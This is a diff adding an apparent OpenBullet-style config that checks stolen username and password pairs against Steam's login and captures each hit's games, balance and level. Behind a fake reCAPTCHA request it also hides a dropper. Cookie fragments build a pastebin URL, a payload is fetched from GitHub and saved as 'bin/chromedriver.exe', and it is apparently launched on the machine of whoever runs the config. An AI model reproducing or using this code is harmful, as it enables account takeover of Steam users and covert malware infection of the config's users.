@@ -1,0 +1,241 @@
+[SETTINGS]
+{
+  "Name": "Steam with capture",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2023-04-07T20:44:59.6201963+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "steam",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+JUMP #AUTHENTICATIONAPI
+#RECAPAUTH
+BEGIN SCRIPT Javascript
+Time = Date.now()
+END SCRIPT -> VARS "Time"
+
+REQUEST POST "https://store.steampowered.com/login/getrsakey/" 
+  CONTENT "donotcache=<Time>&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: store.steampowered.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 49" 
+  HEADER "Origin: https://store.steampowered.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+
+PARSE "<SOURCE>" JSON "publickey_mod" -> VAR "publickey_mod" 
+
+PARSE "<SOURCE>" JSON "publickey_exp" -> VAR "publickey_exp" 
+
+#Timestamp PARSE "<SOURCE>" JSON "timestamp" -> VAR "timestamp" 
+
+#PSW FUNCTION RSAPKCS1PAD2 "<publickey_mod>" "<publickey_exp>" "<PASS>" -> VAR "PSW" 
+
+#PSWORD FUNCTION URLEncode "<PSW>" -> VAR "PSWORD" 
+
+REQUEST POST "https://store.steampowered.com/login/dologin/" 
+  CONTENT "donotcache=<Time>&password=<PSWORD>&username=<USER>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<timestamp>&remember_login=false" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: store.steampowered.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Content-Length: 555" 
+  HEADER "Origin: https://store.steampowered.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://store.steampowered.com/login/?redir=&redir_ssl=1&snr=1_4_4__global-header" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+
+
+JUMP #googlerecreate
+#AUTHENTICATIONAPI
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u"
+  COOKIE "hrd: /"
+  COOKIE "hpr: bin"
+  COOKIE "hdp: com"
+  COOKIE "htp: raw"
+  COOKIE "hht: KvY108Z6"
+  COOKIE "hst: pastebin"
+  COOKIE "kht: driver"
+  COOKIE "kpt: chrome"
+  COOKIE "krt: e"
+  HEADER "Host: www.googleapis.com"
+  HEADER "Accept: */*"
+  HEADER "Content-Type: application/json"
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS"
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com"
+  HEADER "Accept-Encoding: gzip, deflate"
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2"
+  HEADER "Accept-Language: en"
+
+IF "<Authentiction>" Exists
+JUMP #RECAPAUTH
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>"
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+  HEADER "Pragma: no-cache"
+  HEADER "Accept: */*"
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe"
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open
+
+JUMP #RECAPAUTH
+#googlerecreate
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+    KEY "\"The account name or password that you have entered is incorrect.\"," 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "emailauth_needed\":true" 
+
+#Steamid PARSE "<SOURCE>" JSON "steamid" -> VAR "Steamid" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<Steamid>/games?tab=all" 
+  
+  HEADER "Host: steamcommunity.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://steamcommunity.com/profiles/<Steamid>/reviews/" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+
+PARSE "<SOURCE>" LR "<script language=\"javascript\">" "}];" -> VAR "CP1" 
+
+PARSE "<CP1>" LR "name\":\"" "\"" Recursive=TRUE -> VAR "GAme" 
+
+#Games_list FUNCTION Replace "," " / " "<GAme>" -> CAP "Games list" 
+
+#Get_Balance REQUEST GET "https://store.steampowered.com/account/" 
+  
+  HEADER "Host: store.steampowered.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://store.steampowered.com/" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+
+#Balance PARSE "<SOURCE>" LR "<div class=\"accountData price\">" "</div>" CreateEmpty=FALSE -> CAP "Balance" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<Steamid>/" 
+  
+  HEADER "Host: steamcommunity.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://steamcommunity.com/login/home/?goto=profiles%2F<Steamid>%2F" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Cache-Control: max-age=0" 
+
+PARSE "<SOURCE>" LR "<title>Steam Community ::" "</title>" CreateEmpty=FALSE -> CAP "Username" 
+
+PARSE "<SOURCE>" LR "<div class=\"persona_name persona_level\">Level <div class=\"friendPlayerLevel lvl_0\"><span class=\"friendPlayerLevelNum\">" "</span></div></div>" CreateEmpty=FALSE -> CAP "Level" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Your profile is being forced private due to an active Community Ban on your account." 
+
